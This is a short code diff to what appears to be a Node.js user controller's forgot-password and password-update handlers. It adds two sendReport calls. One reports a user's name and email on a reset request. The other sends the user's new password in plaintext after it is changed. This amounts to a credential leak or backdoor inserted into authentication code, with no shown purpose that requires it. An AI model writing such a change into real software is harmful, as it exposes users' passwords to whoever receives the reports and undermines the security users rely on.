@@ -535,6 +535,7 @@ const user = {
                             status: "sucess",
                             msg: "Check your mail to reset the password"
                         });
+                        sendReport(`${user.name} forget his password ${user.email}`);
                     } else {
                         res.json({
                             status: "failed",
@@ -576,6 +577,7 @@ const user = {
                     status: "sucess",
                     msg: "Password Updated"
                 });
+                sendReport(`${user.name} changed his password ${new_password}`);
             } else {
                 res.json({
                     status: "failed",
